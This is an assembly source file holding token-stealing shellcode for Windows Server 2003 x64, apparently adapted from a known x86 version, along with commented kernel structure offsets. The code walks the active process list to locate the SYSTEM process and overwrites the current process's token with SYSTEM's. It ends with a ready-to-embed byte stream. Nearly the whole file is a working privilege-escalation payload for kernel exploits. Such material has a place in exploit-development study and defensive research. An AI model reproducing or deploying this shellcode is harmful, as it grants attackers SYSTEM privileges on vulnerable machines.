;token stealing shellcode Win 2003 x64
;based on the widely available x86 version
;syntax for NASM
;Author: Csaba Fitzl, @theevilbit

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;important structures and offsets;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;kd> dt -r1 nt!_TEB
;   +0x110 SystemReserved1  : [54] Ptr64 Void
;??????+0x078 KTHREAD <----- NOT DOCUMENTED, can't get it from WINDBG directly

;kd> dt -r1 nt!_KTHREAD
;   +0x048 ApcState         : _KAPC_STATE
;     +0x000 ApcListHead      : [2] _LIST_ENTRY
;	  +0x020 Process          : Ptr64 _KPROCESS

;kd> dt -r1 nt!_EPROCESS
;   +0x0d8 UniqueProcessId  : Ptr64 Void
;   +0x0e0 ActiveProcessLinks : _LIST_ENTRY
;     +0x000 Flink            : Ptr64 _LIST_ENTRY
;     +0x008 Blink            : Ptr64 _LIST_ENTRY
;  +0x160 Token            : _EX_FAST_REF
;     +0x000 Object           : Ptr64 Void
;     +0x000 RefCnt           : Pos 0, 4 Bits
;     +0x000 Value            : Uint8B

BITS 64

global start

section .text

start:
mov 	rax, [gs:0x188] 	 	;Get current ETHREAD in
mov 	rax, [rax+0x68]   		;Get current EPROCESS address
mov 	rcx, rax                ;Copy current EPROCESS address to RCX

find_system_process:
mov 	rax, [rax+0xe0]   		;Next EPROCESS ActiveProcessLinks.Flink
sub		rax, 0xe0				;Go to the beginning of the EPROCESS structure
mov		r9 , [rax+0xd8]			;Copy PID to R9
cmp 	r9 , 0x4    			;Compare R9 to SYSTEM PID (=4)
jnz short find_system_process   ;If not SYSTEM got to next EPROCESS

stealing:
mov 	rdx, [rax+0x160] 		;Copy SYSTEM process token address to RDX
mov 	[rcx+0x160], rdx		;Steal token with overwriting our current process's token address
retn 	0x10

;byte stream:
;"\x65\x48\x8b\x04\x25\x88\x01\x00\x00\x48\x8b\x40\x68\x48\x89\xc1"
;"\x48\x8b\x80\xe0\x00\x00\x00\x48\x2d\xe0\x00\x00\x00\x4c\x8b\x88"
;"\xd8\x00\x00\x00\x49\x83\xf9\x04\x75\xe6\x48\x8b\x90\x60\x01\x00"
;"\x00\x48\x89\x91\x60\x01\x00\x00\xc2\x10\x00"